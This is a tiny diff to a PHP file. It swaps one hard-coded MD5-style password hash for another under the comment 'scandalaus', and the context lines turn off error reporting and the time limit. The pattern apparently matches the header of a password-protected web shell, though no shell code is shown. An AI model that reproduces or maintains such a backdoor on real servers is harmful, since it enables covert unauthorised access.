@@ -1,6 +1,6 @@
 <?php
 
-$password = '850b7a8a0a64ba3bc150838d86a47ebb'; // scandalaus
+$password = 'c882985dd7957ba97b8b445f49a68d2a'; // scandalaus
 error_reporting(0);
 set_time_limit(0);
 
